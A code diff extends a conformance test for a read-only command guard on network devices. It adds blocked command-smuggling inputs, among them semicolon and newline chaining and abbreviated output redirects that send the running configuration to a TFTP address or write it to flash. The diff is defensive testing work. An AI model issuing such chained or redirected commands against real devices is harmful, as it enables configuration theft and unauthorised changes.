@@ -142,13 +142,20 @@ def _check_c2() -> ConformanceResult:
             "device layer unavailable -- install the [lab] extra "
             "(pip install \"hardrails[lab]\") to exercise the read-path guard",
         )
-    allowed = ["show version", "ping 10.0.0.1", "traceroute 10.0.0.1"]
+    allowed = [
+        "show version", "ping 10.0.0.1", "traceroute 10.0.0.1",
+        "show running-config | include secret",  # a legit filter pipe stays allowed
+    ]
     blocked = [
         "configure terminal", "conf t", "no ip http server", "write memory", "wr",
         "copy running-config startup-config", "reload", "clear counters",
         "interface GigabitEthernet0/0", "debug all", "tclsh",
         "show version\nconfigure terminal", "show run ; conf t",
         "show running-config | redirect flash:pwn.txt",
+        # Abbreviated + chained output redirects: a write-target blocklist missed
+        # these; the filter allowlist must catch them (issue #35).
+        "show running-config | red tftp://10.0.0.9/cfg",
+        "show run | section bgp | te flash:x",
     ]
     # Attribute access (not a bound import) so a regression / monkeypatch is seen.
     ok_allowed = [c for c in allowed if devices._read_command_rejection(c) is None]
@@ -157,7 +164,7 @@ def _check_c2() -> ConformanceResult:
     detail = (
         f"{len(ok_allowed)}/{len(allowed)} legit reads allowed, "
         f"{len(ok_blocked)}/{len(blocked)} write/inject payloads refused "
-        "(incl. newline/';'/redirect smuggling)"
+        "(incl. newline/';'/redirect + abbreviated/chained-pipe smuggling)"
     )
     return ConformanceResult("C2", title, passed, detail)
 
